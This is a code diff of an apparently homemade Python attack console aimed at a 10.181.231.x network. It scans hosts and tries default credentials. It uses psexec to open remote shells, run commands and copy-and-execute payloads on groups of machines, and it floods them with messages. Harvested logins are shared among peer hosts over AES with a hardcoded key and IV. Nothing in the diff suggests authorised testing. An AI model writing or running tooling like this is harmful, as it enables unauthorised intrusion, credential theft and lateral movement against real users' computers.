@@ -5,6 +5,8 @@ import time
 import threading
 from threading import *
 import socket
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES
 
 
 banner = '''
@@ -17,12 +19,13 @@ banner = '''
 |  $$$$$$/| $$$$$$$$| $$
  \______/ |________/|__/
                           '''
-validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "include", "exclude", "intel"]
-validDesc = ["Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name" , "List all hosts stored on this device","Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Remove an IP from the protected list", "Add an IP to the protected list", "View intel on a given IP"]
-validUsage = ["-", "-", "-","credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "-", "exclude [ip]", "include [ip]", "intel [ip]"]
-ips = []
-ipNames = ["Default"]
-customLists = [[]]
+validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "add", "remove", "intel"]
+validDesc = ["Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name" , "List all hosts stored on this device","Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Add an IP to a list", "Remove an IP from a list", "View intel on a given IP"]
+validUsage = ["-", "-", "-","credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]", "remove [ip] [list]", "intel [ip]"]
+
+ips = [112,125,130,131,133,134,137,138,139,140,142,143,144,145,146,147,148,151,152,154,155,159,160,165,166,167,169,171,172,174,175,176,177,179,180,181,222,224,229,230,231]
+ipNames = []
+customLists = []
 defaultCredIps = []
 exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166, 120, 125, 142, 167, 132]
 
@@ -30,10 +33,13 @@ completeFlags = []
 
 
 intel = {
-"10.181.231.138": ["We don't like him"]
-
+"10.181.231.165": ["What a legend"]
 }
-intelSources = ["127.0.0.1"]
+intelSources = ["127.0.0.1","10.181.231.165", "10.181.231.130"] #DELETE YOUR IP FROM THIS
+
+#CRYPTO INIT, THESE GET CHANGED REGULARL
+key = b'\xb4y\xbd\xa0\xf2,\x1f~\x03\xb3\xef<7\xc4\xca\xde'
+iv = b'C\xab\x8ef!C_\x13\xf5\xa2Z\xa0\xdaM\x19('
 
 #=============================================================================
 #=============================================================================
@@ -41,16 +47,58 @@ intelSources = ["127.0.0.1"]
 #=============================================================================
 #=============================================================================
 
+def AES_pad(data):
+    if len(data) % 16 == 0:
+        return data
+    databytes = bytearray(data)
+    padding_required = 15 - (len(databytes) % 16)
+    databytes.extend(b'\x80')
+    databytes.extend(b'\x00' * padding_required)
+    return bytes(databytes)
+
+def AES_unpad(data):
+    if not data:
+        return data
+
+    data = data.rstrip(b'\x00')
+    if data[-1] == 128: # b'\x80'[0]:
+        return data[:-1]
+    else:
+        return data
+
+def encryptAES(data):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    data = AES_pad(data.encode())
+    return cipher.encrypt(data)
+
+def decryptAES(data):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    data = cipher.decrypt(data)
+    return AES_unpad(data).decode()
+
+
+def testCrypto():
+    msg = "Testing times two twice"
+    code = encryptAES(msg)
+    decode1 = decryptAES(code)
+
+testCrypto()
+
+
+
+
 def serverT():
     serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host = "127.0.0.1"
-    port = 1337
+    port = 13370
     serverSock.bind((host, port))
     serverSock.listen(5)
-    print("started")
     while True:
-        clientsocket, address = serverSock.accept()
-        client(clientsocket, address)
+        try:
+            clientsocket, address = serverSock.accept()
+            client(clientsocket, address)
+        except:
+            pass
 
 class client(Thread):
     global players
@@ -64,7 +112,7 @@ class client(Thread):
     def run(self):
         cmd = (self.sock.recv(1024).decode()).split("|")
         response = self.processRequest(cmd)
-        self.sock.send(str(response).encode())
+        self.sock.send(encryptAES(str(response)))
 
     def processRequest(self, cmd):
         global intel
@@ -102,7 +150,7 @@ def makeRequest(ip, port, type, subject, body):
     sock.connect((ip, port))
     packet = (type + "|" + subject + "|" + body).encode()
     sock.send(packet)
-    response = sock.recv(1024).decode()
+    response = decryptAES(sock.recv(1024))
     sock.close()
     return response
 
@@ -116,28 +164,27 @@ def updateIntel(host, info, action="add"):
             intel[host] = [info]
 
         for comp in intelSources:
-            makeRequest(comp, 1337, "update", host, info)
+            makeRequest(comp, 13370, "update", host, info)
     if action == "remove":
         if host in intel:
             if info in intel[host]:
                 intel[host].remove(info)
 
         for comp in intelSources:
-            makeRequest(comp, 1337, "remove", host, info)
+            makeRequest(comp, 13370, "remove", host, info)
 
 def menu():
     for line in banner:
         print(line, end="")
-    print("\nRun 'scan' to find all IPs, then 'credtest' to see which of those have default creds")
+    print("\n[!] Type 'help' to see available commands, and 'usage' for syntax")
 
     while True:
         cmd = input("\n> ").split(" ")
-
         if cmd[0] == "help":
             print("\n[!] Available commands are:\n")
             for i in range(0, len(validCommands)):
                 print("[+] " + validCommands[i] + " :: " + validDesc[i])
-            print("\n[+] Type 'usage' for info on how to run the commands\n")
+            print("\n[!] Type 'usage' for info on how to run the commands\n")
 
         if cmd[0] == "usage":
             print("\n[!] Usage is as follows:\n")
@@ -149,7 +196,12 @@ def menu():
             rconnect(cmd[1], cmd[2], cmd[3])
 
         if cmd[0] == "msg":
-            rmsg()
+            targList = customLists[ipNames.index(cmd[1])]
+            number = cmd[2]
+            message = ""
+            for x in range(3, len(cmd)):
+                message += (cmd[x] + " ")
+            rmsg(targList, message, number)
 
         if cmd[0] == "clear":
             os.system("cls")
@@ -163,7 +215,6 @@ def menu():
                 creds = cmd[2]
                 command = cmd[3]
                 rexec(targList, command, creds)
-
 
         if cmd[0] == "rcpy":
             if len(cmd) == 4:
@@ -186,17 +237,27 @@ def menu():
 
         if cmd[0] == "credtest":
             try:
-                credTest(cmd[1])
+                credTest(cmd[1], cmd[2])
             except:
                 pass
 
-        if cmd[0] == "exclude":
-            if int(cmd[1]) not in exclude:
-                exclude.append(int(cmd[1]))
+        if cmd[0] == "remove":
+            if len(cmd) == 3:
+                if cmd[1] in ipNames:
+                    targlist = customLists[ipNames.index(cmd[1])]
+                    if cmd[2] in targList:
+                        targList.remove(cmd[2])
 
-        if cmd[0] == "include":
-            if int(cmd[1]) in exclude:
-                exclude.remove(int(cmd[1]))
+        if cmd[0] == "add":
+            if len(cmd) == 3:
+                if cmd[2] in ipNames:
+                    targlist = customLists[ipNames.index(cmd[2])]
+                    if cmd[2] not in targlist:
+                        targlist.append(int(cmd[1]))
+                else:
+                    customLists.append([int(cmd[1])])
+                    ipNames.append(cmd[2])
+
 
         if cmd[0] == "intel":
             try:
@@ -207,19 +268,20 @@ def menu():
 
 
 def getintel(host):
+    returnIntel = []
+    print("\n[!] Showing information for %s\n|" % host)
     if host in intel:
-        returnIntel = []
-        print("\n[!] Showing information for %s\n" % host)
         for item in intel[host]:
             returnIntel.append(item)
-        for comp in intelSources:
-            info = makeRequest(comp, 1337, "get", host, "")
-            info = info.split("|")
-            for item in info:
-                if item not in returnIntel:
-                    returnIntel.append(item)
-        for item in returnIntel:
-            print("[+] %s" % item)
+            print("|----[+] %s" % item)
+            pass
+    for comp in intelSources:
+        info = makeRequest(comp, 13370, "get", host, "")
+        info = info.split("|")
+        for item in info:
+            if item not in returnIntel:
+                returnIntel.append(item)
+                print("|----[+] %s" % item)
 
 
 
@@ -282,7 +344,7 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): 
     psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
     resp = os.system(psexecString)
     if sav and tgt not in customLists[listIndex]:
-        infostring = "LOGIN: " + uname + "/" + pword
+        infostring = "LOGIN: " + uname + ":" + pword
         if str(resp) == "0":
             customLists[listIndex].append(ending)
             updateIntel(tgt, infostring)
@@ -351,19 +413,14 @@ def rscannames():  # Conducts a scan of the netbios names to discover any hosts 
     print("\n==================================================\n")
 
 
-def rmsg():
+def rmsg(targets, reason, num):
     maxThreads = 64
-    iprangeMin = int(input("\n[IPMIN]> "))
-    iprangeMax = int(input("[IPMAX]> ")) + 1
-    reason = input("[MESSG]> ")
-    num = int(input("[NUMBR]> "))
     print("")
     for t in range(0, num):
-        for i in range(iprangeMin, iprangeMax):
-            if i in ips:
-                target = "10.181.231." + str(i)
-                x = threading.Thread(target=rmsgT, args=(reason,target))
-                x.start()
+        for i in targets:
+            target = "10.181.231." + str(i)
+            x = threading.Thread(target=rmsgT, args=(reason,target))
+            x.start()
 
 
 def rmsgT(reason="", target=""):
